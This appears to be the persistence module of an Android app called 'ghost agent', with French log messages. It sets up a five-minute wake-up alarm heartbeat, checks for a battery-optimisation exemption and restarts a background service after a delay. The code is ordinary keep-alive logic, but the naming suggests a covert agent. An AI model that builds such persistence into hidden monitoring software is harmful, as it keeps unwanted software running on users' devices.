package com.ghost.agent.core;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

import com.ghost.agent.receivers.BootReceiver;

public class PersistenceManager {
    
    private static final String TAG = "PersistenceManager";
    private static final String PREFS_NAME = "GhostPrefs";
    private static final long INTERVAL = 5 * 60 * 1000; // 5 minutes
    
    private Context context;
    private SharedPreferences prefs;
    private AlarmManager alarmManager;
    private PowerManager powerManager;
    
    public PersistenceManager(Context context) {
        this.context = context;
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        this.alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        this.powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
    }
    
    public void applyPersistence() {
        if (!prefs.getBoolean("persistent", true)) return;
        
        Log.i(TAG, "Application de la persistance");
        
        setupAlarm();
        ignoreBatteryOptimizations();
    }
    
    private void setupAlarm() {
        try {
            Intent intent = new Intent(context, BootReceiver.class);
            intent.setAction("com.ghost.agent.HEARTBEAT");
            
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE :
                PendingIntent.FLAG_UPDATE_CURRENT;
            
            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, flags);
            
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + INTERVAL,
                INTERVAL, pi
            );
            
            Log.i(TAG, "Alarm configurée");
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur alarm: " + e.getMessage());
        }
    }
    
    private void ignoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                String pkg = context.getPackageName();
                if (!powerManager.isIgnoringBatteryOptimizations(pkg)) {
                    // Nécessite une activité pour demander la permission
                }
            } catch (Exception e) {
                Log.e(TAG, "Erreur: " + e.getMessage());
            }
        }
    }
    
    public void selfRestart() {
        Log.i(TAG, "Auto-redémarrage...");
        
        new android.os.Handler().postDelayed(() -> {
            Intent intent = new Intent(context, GhostService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }, 5000);
    }
}
